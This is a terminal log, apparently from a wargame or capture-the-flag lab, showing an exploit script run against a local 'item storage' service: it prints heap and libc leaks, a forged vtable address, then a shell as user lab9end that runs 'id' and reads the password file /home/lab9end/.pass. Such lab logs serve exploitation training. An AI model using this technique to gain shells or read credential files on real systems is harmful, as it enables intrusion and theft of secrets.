```sh
/home/gameadmin# python exploit.py
[+] Opening connection to 127.0.0.1 on port 9941: Done
Press Enter...
Memory leak [heap]:
Leak: 0x98ef0b8
Memory leak [libc]:
Leak libc: 0xb7699450
Libc_adress_system: 0xb752f190
leak: 160362680
forge_vtable: 0x98ef054
[*] Switching to interactive mode
+----------- clark's improved item storage -----------+
| [ -- Now using HashSets for insta-access to items!  |
| 1. Open a lockbox                                   |
| 2. Add an item to a lockbox                         |
| 3. Get an item from a lockbox                       |
| 4. Destroy your lockbox and items in it             |
| 5. Exit                                             |
+-----------------------------------------------------+
Enter choice: Which lockbox?: Item value: $ id
uid=1035(lab9end) gid=1036(lab9end) groups=1036(lab9end),1001(gameuser)
$ cat /home/lab9end/.pass
1_d1dNt_3v3n_n33d_4_Hilti_DD350
```
